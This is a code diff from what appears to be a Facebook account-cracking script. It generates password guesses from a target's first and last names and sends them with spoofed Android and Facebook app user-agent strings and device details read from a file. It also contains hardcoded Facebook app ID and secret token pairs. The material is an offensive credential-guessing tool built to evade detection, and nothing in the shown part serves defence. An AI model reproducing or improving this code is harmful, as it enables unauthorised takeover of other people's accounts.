@@ -464,24 +464,16 @@ class crack_main():
                                 ln = fn
                         for pw in passlist:
                                 pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',name).replace('name',name.lower())
-                                fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
-                                fbbv = str(random.randint(111111111,999999999))
-                                android_version = device['android_version']
-                                model = device['model']
-                                build = device['build']
-                                fblc = device['fblc']
-                                fbcr = sim_id
-                                fbmf = device['fbmf']
-                                fbbd = device['fbbd']
-                                fbdv = device['fbdv']
-                                fbsv = device['fbsv']
-                                fbca = device['fbca']
-                                fbdm = device['fbdm']
-                                fbfw = '1'
-                                fbrv = '0'
-                                fban = 'FB4A'
-                                fbpn = 'com.facebook.katana'
-                                uas = random.choice(['Mozilla/5.0 (Linux; Android 10; itel W4001 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.105 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/330.0.0.10.108;]','Mozilla/5.0 (Linux; Android 8.1.0; Plume L1 Plus Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36[FBAN/EMA;FBLC/ar_AR;FBAV/336.0.0.11.99;]','Mozilla/5.0 (Linux; Android 8.1.0; Hisense U605 Build/OPM2.171019.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/336.0.0.11.99;]','Mozilla/5.0 (Linux; Android 10; TECNO BC1 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/335.0.0.15.96;]','Mozilla/5.0 (Linux; Android 11; Premier5 Build/R01005; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/335.0.0.15.96;]','Mozilla/5.0 (Linux; Android 10; itel P681L Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.79 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/333.0.0.12.108;]','Mozilla/5.0 (Linux; Android 10; SmartE11 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/336.0.0.11.99;]'])
+                                infos = open('device_info.txt','r').read()
+                                try:
+                                        version_,model_,brand_name_,width_,height_=infos.split('$')
+                                except:
+                                        version_ = str(random.randint(7,13))
+                                        model_ = "Infinix"
+                                        brand_name_ = "Infinix"
+                                        width_ = "720"
+                                        height_ = "1280"
+                                uas=random.choice(['Mozilla/5.0 (Linux; Android 10; itel W4001 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.105 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/330.0.0.10.108;]','Mozilla/5.0 (Linux; Android 8.1.0; Plume L1 Plus Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36[FBAN/EMA;FBLC/ar_AR;FBAV/336.0.0.11.99;]','Mozilla/5.0 (Linux; Android 8.1.0; Hisense U605 Build/OPM2.171019.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/336.0.0.11.99;]','Mozilla/5.0 (Linux; Android 10; TECNO BC1 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/335.0.0.15.96;]','Mozilla/5.0 (Linux; Android 11; Premier5 Build/R01005; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/335.0.0.15.96;]','Mozilla/5.0 (Linux; Android 10; itel P681L Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.79 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/333.0.0.12.108;]','Mozilla/5.0 (Linux; Android 10; SmartE11 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/336.0.0.11.99;]'])
                                 fak_tn="350685531728|62f8ce9f74b12f84c123cc23437a4a32","275254692598279|585aec5b4c27376758abb7ffcb9db2af"
                                 adid = str(uuid.uuid4())
                                 abhi = "5531728|62f8ce9"
@@ -509,6 +501,7 @@ class crack_main():
                 except Exception as e:
                         pass
                         #print(e)
+        
 
         def pasw(self):
                 passlist = []
